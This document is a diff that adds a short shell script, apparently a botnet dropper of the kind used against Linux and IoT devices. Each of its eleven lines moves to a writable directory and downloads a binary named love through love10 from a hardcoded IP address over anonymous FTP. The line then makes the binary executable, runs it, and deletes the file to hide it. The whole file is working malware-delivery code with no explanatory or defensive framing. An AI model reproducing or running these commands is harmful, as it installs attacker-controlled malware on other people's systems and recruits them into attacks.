@@ -1,0 +1,11 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love love; chmod 777 love ./love; rm -rf love
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love1 love1; chmod 777 love1 ./love1; rm -rf love1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love2 love2; chmod 777 love2 ./love2; rm -rf love2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love3 love3; chmod 777 love3 ./love3; rm -rf love3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love4 love4; chmod 777 love4 ./love4; rm -rf love4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love5 love5; chmod 777 love5 ./love5; rm -rf love5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love6 love6; chmod 777 love6 ./love6; rm -rf love6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love7 love7; chmod 777 love7 ./love7; rm -rf love7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love8 love8; chmod 777 love8 ./love8; rm -rf love8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love9 love9; chmod 777 love9 ./love9; rm -rf love9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 86.105.212.245 love10 love10; chmod 777 love10 ./love10; rm -rf love10
